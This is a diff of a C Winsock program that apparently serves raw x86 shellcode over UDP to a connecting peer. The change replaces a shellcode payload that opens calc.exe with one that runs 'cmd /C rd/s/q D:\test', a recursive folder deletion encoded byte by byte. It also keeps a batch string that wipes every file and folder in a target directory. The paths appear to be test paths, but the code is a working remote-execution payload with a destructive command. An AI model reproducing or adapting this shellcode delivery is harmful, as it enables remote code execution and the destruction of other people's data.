@@ -4,11 +4,10 @@
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 #define BUFLEN 1024 //Max length of buffer
-#define CMD_COUNT 2
 #define PORT 8888
-char buf[CMD_COUNT][BUFLEN] = { {
-CMD_SHELL_CODE
-// 0. open calc.exe
+char buf[BUFLEN] =
+// cmd /C "rd/s/q D:\test" 
+{CMD_SHELL_CODE
 , 0x50
 , 0x53
 , 0x51
@@ -72,12 +71,30 @@ CMD_SHELL_CODE
 , 0x03, 0xC3
 , 0x33, 0xD2
 , 0x52
-, 0x68, 0x63, 0x61, 0x6C, 0x63
+
+// cmd /C "rd/s/q D:\test"
+, 0x68, 0x73, 0x74, 0x22, 0x20 // st" 
+, 0x68, 0x3A, 0x5C, 0x74, 0x65 // :\te
+, 0x68, 0x2F, 0x71, 0x20, 0x44 // /q D
+, 0x68, 0x72, 0x64, 0x2F, 0x73 // rd/s
+, 0x68, 0x2F, 0x43, 0x20, 0x22 // /C "
+, 0x68, 0x63, 0x6D, 0x64, 0x20 // cmd 
+
+/*
+, 0x68, 0x2e, 0x65, 0x78, 0x65
+, 0x68, 0x63, 0x61, 0x6c, 0x63
+, 0x68, 0x6d, 0x33, 0x32, 0x5c
+, 0x68, 0x79, 0x73, 0x74, 0x65
+, 0x68, 0x77, 0x73, 0x5c, 0x53
+, 0x68, 0x69, 0x6e, 0x64, 0x6f
+, 0x68, 0x43, 0x3a, 0x5c, 0x57
+*/
 , 0x8B, 0xF4
 , 0x6A, 0x0A
 , 0x56
 , 0xFF, 0xD0
-, 0x83, 0xC4, 0x2E
+, 0x83, 0xC4, 0x42
+//, 0x83, 0xC4, 0x46
 , 0x5D
 , 0x5F
 , 0x5E
@@ -85,12 +102,10 @@ CMD_SHELL_CODE
 , 0x59
 , 0x5B
 , 0x58
-, 0xC3
-},
-{0x00}
-};
+, 0xC3}
+;
 // batch from https://stackoverflow.com/questions/6836566/batch-file-delete-all-files-and-folders-in-a-directory
-char batchRmDir[] = " set folder=\"C:\\Users\\Fengl\\Desktop\\temp\\hello\"\ncd /d %folder%\nfor /F \"delims=\" %%i in ('dir /b') do (rmdir \"%%i\" /s/q || del \"%%i\" /s/q)\n";//最前边预留一个空格
+char batchRmDir[] = " set folder=\"D:\\test\"\ncd /d %folder%\nfor /F \"delims=\" %%i in ('dir /b') do (rmdir \"%%i\" /s/q || del \"%%i\" /s/q)\n";//最前边预留一个空格
 //The port on which to listen for incoming data
 SOCKET sock;
 struct sockaddr_in server;
@@ -151,8 +166,8 @@ int main(void)
 				gets_s(recvBuf);
 				printf("get content: 0x%X\n", recvBuf[0]);
 				if (recvBuf[0] == CMD_SHELL_CODE) {
-					printf("buf content: %s\n", buf[0]);
-				    int r = sendto(sock, buf[0], BUFLEN, 0, (struct sockaddr*)&server, server_size);
+					printf("buf content: %s\n", buf);
+				    int r = sendto(sock, buf, BUFLEN, 0, (struct sockaddr*)&server, server_size);
 					printf("send result: %d\n", r);
 				}
 				else if (recvBuf[0] == CMD_MSG_BOX) {
